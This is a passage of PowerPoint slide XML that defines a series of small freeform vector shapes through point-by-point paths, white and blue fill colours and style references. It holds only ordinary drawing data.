          <p:cNvPr id="414" name="CustomShape 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2725560" y="4470480"/>
            <a:ext cx="10440" cy="10440"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="7" h="7">
                <a:moveTo>
                  <a:pt x="3" y="7"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="5" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="7"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="ffffff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="415" name="CustomShape 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2744640" y="4470480"/>
            <a:ext cx="7200" cy="10440"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="5" h="7">
                <a:moveTo>
                  <a:pt x="3" y="7"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="4" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="7"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="ffffff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="416" name="CustomShape 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2671920" y="4324320"/>
            <a:ext cx="29520" cy="145440"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="19" h="92">
                <a:moveTo>
                  <a:pt x="6" y="1"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="6" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="16"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="41"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="56"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="74"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="92"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="91"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="89"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="81"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="70"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="56"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="42"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="1"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="3f9eff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="417" name="CustomShape 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2827440" y="4305240"/>
            <a:ext cx="42120" cy="162720"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="27" h="103">
                <a:moveTo>
                  <a:pt x="27" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="26" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="25" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="22" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="20" y="18"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="49"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="73"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="20" y="103"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="103"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="101"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="92"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="80"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="65"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="47"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="31"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="27" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="3f9eff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="418" name="CustomShape 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2671920" y="4332240"/>
            <a:ext cx="27720" cy="126360"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="18" h="80">
                <a:moveTo>
                  <a:pt x="6" y="2"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="6" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="15"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="24"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="50"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="65"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="80"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="80"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="78"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="71"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="62"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="50"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="37"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="24"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="2"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="59b2ff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="419" name="CustomShape 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2673360" y="4341960"/>
            <a:ext cx="21600" cy="108720"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="14" h="69">
                <a:moveTo>
                  <a:pt x="5" y="1"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="5" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="21"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="30"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="42"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="54"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="69"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="67"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="66"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="60"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="52"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="42"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="31"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="19"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="9"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="1"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="72c6ff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="420" name="CustomShape 36"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2674800" y="4349880"/>
            <a:ext cx="18360" cy="88200"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="12" h="56">
                <a:moveTo>
                  <a:pt x="4" y="2"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="3" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="17"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="25"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="35"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="46"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="56"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="56"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="55"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="51"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="44"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="35"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="17"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="2"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="8cd8ff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="421" name="CustomShape 37"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2674800" y="4357800"/>
            <a:ext cx="15120" cy="72360"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="10" h="46">
                <a:moveTo>
                  <a:pt x="4" y="1"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="3" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="21"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="46"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="46"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="43"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="40"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="35"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="21"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="1"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="a5edff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="422" name="CustomShape 38"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2678040" y="4367160"/>
            <a:ext cx="10440" cy="51840"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="7" h="33">
                <a:moveTo>
                  <a:pt x="2" y="1"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="1" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="15"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="20"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="33"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="33"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="31"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="20"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="15"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="9"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="1"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="bfffff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="423" name="CustomShape 39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2828880" y="4314960"/>
            <a:ext cx="37440" cy="142200"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="24" h="90">
                <a:moveTo>
                  <a:pt x="24" y="1"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="22" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="21" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17" y="17"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="43"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="64"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="90"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="90"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="88"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="81"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="69"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="56"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="41"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="24" y="1"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="59b2ff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="424" name="CustomShape 40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2830680" y="4325760"/>
            <a:ext cx="29520" cy="119880"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="19" h="76">
                <a:moveTo>
                  <a:pt x="19" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="19" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="22"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="54"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="76"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="76"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="74"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="68"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="59"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="47"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="35"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="22"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="72c6ff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="425" name="CustomShape 41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2833560" y="4335480"/>
            <a:ext cx="23040" cy="99360"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="15" h="63">
                <a:moveTo>
                  <a:pt x="15" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="15" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="19"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="30"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="44"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="63"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="63"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="62"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="56"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="49"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="40"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="19"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="8cd8ff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="426" name="CustomShape 42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2833560" y="4344840"/>
            <a:ext cx="18360" cy="78480"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="12" h="50">
                <a:moveTo>
                  <a:pt x="12" y="1"/>
                </a:moveTo>
                <a:lnTo>
